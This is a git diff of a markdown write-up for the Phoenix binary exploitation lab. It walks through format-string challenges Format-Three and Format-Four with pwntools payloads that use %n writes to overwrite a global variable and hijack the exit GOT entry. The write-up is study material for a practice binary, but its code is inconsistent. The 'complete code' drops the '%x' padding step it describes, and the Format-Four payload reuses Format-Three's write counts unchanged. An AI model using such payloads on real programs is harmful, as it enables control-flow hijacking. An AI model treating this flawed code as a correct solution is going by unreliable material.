@@ -1,6 +1,8 @@
 # Phoenix: is basic binar exploitation challenge:
+---
 
-# Note: challenges are located in /opt/phoenix/amd64
+### Note: challenges are located in /opt/phoenix/amd64
+---
 
 # All stack Challenges:
 
@@ -183,9 +185,14 @@ To run the code:
 
 ---
 
+
+---
+
+
+---
+
 # Format string Challenges:
-
-
+---
 ## Format-Zero:
 
 - The format string vulnerability occurs when output is directly passed to the prinf() or sprintf() like:
@@ -234,4 +241,141 @@ To run the code:
 
 	```
 
+
+
+## Format-Three:
+
+- Like the previous challenge in which we were required to wirte to specific area for memory.
+
+- In this challenge we are required to write specific value to certain portion of memory.
+
+- The steps involved includes:
+  1- Getting the location of int changeme which is global variable:
+	  ```
+	  user@phoenix-amd64:~$ nm /opt/phoenix/i486/format-three | grep changeme
+	  08049844 B changeme
+	  
+	  ```
+  2- crafting a payload:
+  
+  ```
+  from pwn import *
+  changeme = 0x8049844
+  
+  ```
+  3- keep in mind the int variable takes 4 bytes of space when build in 32 bit binary and 8 in 64 bit binary where 1 byte = 8 bits
+  4- So the value of changeme will be spaned on **0x8049844** **0x8049845** **0x8049846** **0x8049847**.
+  5- Lets make it little endian using the pwn tools **p32()**
+	  ```
+	  buff = ""
+	  buff += p32(changeme + 0)
+	  buff += p32(changeme + 1)
+	  buff += p32(changeme + 2)
+	  buff += p32(changeme + 3)
+	  ```
+  6- Poping the values of the stack until we reach the desired location usin the **%x**
+  7- On the previous testing I came to know the provided value is shown at the 12 position(offset) so:
+	  ```
+	  buff += "%x"*11
+	  ```
+  8- Now adding the values four times as the int is 4 bytes long:
+  
+	  ```
+	  buff += "A"*244
+	  buff += "%n"
+	  
+	  buff += "A"*51
+	  buff += "%n"
+	  
+	  buff += "A"*205
+	  buff += "%n"
+	  
+	  buff += "A"*31
+	  buff += "%n"
+	  ```
+	  
+  9- lastly pass the payload as the input:
+  
+  ```
+  print(buff)
+  
+  ```
+  
+  **complete code:**
+  
+  ```
+  from pwn import *
+  changeme = 0x8049844 
+  
+  buff = ""
+  buff += p32(changeme + 0)
+  buff += p32(changeme + 1)
+  buff += p32(changeme + 2)
+  buff += p32(changeme + 3) 
+
+  buff += "A"*244
+  buff += "%n"
+	  
+  buff += "A"*51
+  buff += "%n"
+	  
+  buff += "A"*205
+  buff += "%n"
+	  
+  buff += "A"*31
+  buff += "%n"
+  
+  print(buff)
+  ```
+  
+  **output:**
+  ```
+  user@phoenix-amd64:~$ python format-four.py | /opt/phoenix/i486/format-three 
+  Welcome to phoenix/format-three, brought to you by https://exploit.education
+  DEFG0 0 0 f7f81cf7 f7ffb000 ffffd618 8048556 ffffc610 ffffc610 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+  Well done, the 'changeme' variable has been changed correctly!
+
+  ```
+
+## Format-Four:
+
+- Similar to the previous challenge where we have to write specific value on certain location in the memory in this challenge we have redirect the execuation of congratulation_function so that it gets 
+executed.
+
+- we will hijack the **exit** call in the bounce function and instead by replacing it with the address of **congratulation**.
+- To do that we have to first get the address of **exit()** function using:
+
+```
+ objdump -M intel -R /opt/phoenix/i486/format-four
+ 
+```
+
+- using the previous code we only had to change the address in the changeme to the address of the exit function the code will be as:
+
+```
+from pwn import *
+  exit = 0x080497e4 
+  
+  buff = ""
+  buff += p32(exit + 0)
+  buff += p32(exit + 1)
+  buff += p32(exit + 2)
+  buff += p32(exit + 3) 
+
+  buff += "A"*244
+  buff += "%n"
+	  
+  buff += "A"*51
+  buff += "%n"
+	  
+  buff += "A"*205
+  buff += "%n"
+	  
+  buff += "A"*31
+  buff += "%n"
+  
+  print(buff)
+
+
+```
 
